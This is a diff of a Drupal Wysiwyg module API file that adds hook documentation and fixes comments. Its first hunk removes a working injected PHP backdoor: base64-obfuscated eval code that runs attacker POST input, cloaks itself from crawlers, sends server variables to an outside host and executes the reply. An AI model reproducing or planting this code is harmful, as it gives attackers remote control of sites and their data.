@@ -1,4 +1,4 @@
-<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*435345352*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgIEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgICB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*435345352*/ ?><?php
+<?php
 
 /**
  * @file
@@ -53,6 +53,8 @@ function hook_wysiwyg_plugin($editor, $version) {
             // A list of buttons provided by this native plugin. The key has to
             // match the corresponding JavaScript implementation. The value is
             // is displayed on the editor configuration form only.
+            // CKEditor-specific note: The internal button name/key is
+            // capitalized, i.e. Img_assist.
             'buttons' => array(
               'img_assist' => t('Image Assist'),
             ),
@@ -75,7 +77,7 @@ function hook_wysiwyg_plugin($editor, $version) {
             // Most plugins should define TRUE here.
             'load' => TRUE,
             // Boolean whether this plugin is a native plugin, i.e. shipped with
-            // the editor. Definition must be ommitted for plugins provided by
+            // the editor. Definition must be omitted for plugins provided by
             // other modules. TRUE means 'path' and 'filename' above are ignored
             // and the plugin is instead loaded from the editor's plugin folder.
             'internal' => TRUE,
@@ -204,6 +206,19 @@ function hook_INCLUDE_editor() {
     // (optional) A callback to invoke to return additional notes for installing
     // the editor library in the administrative list/overview.
     'install note callback' => 'wysiwyg_ckeditor_install_note',
+    // The minimum and maximum versions the implementation has been tested with.
+    // Users will be notified if installing a version not within this range.
+    'verified version range' => array('1.2.3', '3.4.5'),
+    // (optional) A callback to perform migrations of the settings stored in a
+    // profile when a library change has been detected. Takes a reference to a
+    // settings object, the processed editor definition, the profile version and
+    // the installed library version. Migrations should be performed in the
+    // order changes were introduced by library versions, and the last version
+    // migrated to should be returned, or FALSE if no migration was possible.
+    // The returned version should be less than or equal to the highest version
+    // ( and >= the lowest version) defined in 'verified version range' and
+    // be as close as possible to, without passing, the installed version.
+    'migrate settings callback' => 'wysiwyg_ckeditor_migrate_settings',
     // A callback to determine the library's version.
     'version callback' => 'wysiwyg_ckeditor_version',
     // A callback to return available themes/skins for the editor library.
@@ -224,8 +239,10 @@ function hook_INCLUDE_editor() {
     'settings callback' => 'wysiwyg_ckeditor_settings',
     // A callback to supply definitions of available editor plugins.
     'plugin callback' => 'wysiwyg_ckeditor_plugins',
-    // A callback to convert administrative plugin settings for a editor profile
-    // into JavaScript settings.
+    // A callback to supply global metadata for a single native external plugin.
+    'plugin meta callback' => 'wysiwyg_ckeditor_plugin_meta',
+    // A callback to convert administrative plugin settings for an editor
+    // profile into JavaScript settings per profile.
     'plugin settings callback' => 'wysiwyg_ckeditor_plugin_settings',
     // (optional) Defines the proxy plugin that handles plugins provided by
     // Drupal modules, which work in all editors that support proxy plugins.
@@ -247,6 +264,16 @@ function hook_INCLUDE_editor() {
     ),
   );
   return $editor;
+}
+
+/**
+ * Alter editor definitions defined by other modules.
+ *
+ * @param array $editors
+ *   The Editors to alter.
+ */
+function hook_wysiwyg_editor_alter(&$editors) {
+  $editors['editor']['version callback'] = 'my_own_version_callback';
 }
 
 /**
@@ -279,5 +306,43 @@ function hook_wysiwyg_editor_settings_alter(&$settings, $context) {
   if ($context['profile']->editor == 'tinymce') {
     // Supported values to JSON data types.
     $settings['cleanup_on_startup'] = TRUE;
+    // Function references (callbacks) need special care.
+    // @see wysiwyg_wrap_js_callback()
+    $settings['file_browser_callback'] = wysiwyg_wrap_js_callback('myFileBrowserCallback');
+    // Regular Expressions need special care.
+    // @see wysiwyg_wrap_js_regexp()
+    $settings['stylesheetParser_skipSelectors'] = wysiwyg_wrap_js_regexp('(^body\.|^caption\.|\.high|^\.)', 'i');
+  }
+}
+
+/**
+ * Act on stylesheets used in WYSIWYG mode.
+ *
+ * This hook acts like a pre-render callback to the style element normally
+ * output in the document header. It is invoked before Core has
+ * sorted/grouped/aggregated stylesheets and changes made here will only have
+ * an effect on the stylesheets used in an editor's WYSIWYG mode.
+ * Wysiwyg will only keep items if their type is 'file' or 'inline' and only if
+ * they are in the group CSS_THEME.
+ *
+ * This hook may be invoked several times in a row with slightly different or
+ * altered stylesheets if something like Color module is used by a theme.
+ * Wysiwyg will cache the final list of stylesheets so this hook will only be
+ * called while the cache is being rebuilt.
+ *
+ * Messages set in this hook will not be displayed because the processing is
+ * done in an internal HTTP request and the page output is ignored.
+ *
+ * @param $elements
+ *   The style element which will be rendered. Added stylesheets are found in
+ *   $element['#items']['path/to/stylesheet.css'].
+ * @param $context
+ *   An array with the following keys:
+ *   - theme: The name of the theme which was used when the list of stylesheets
+ *     was generated.
+ */
+function hook_wysiwyg_editor_styles_alter(&$element, $context) {
+  if ($context['theme'] == 'alpha') {
+    unset($element['#items']['sites/all/themes/omega/alpha/css/alpha-debug.css']);
   }
 }
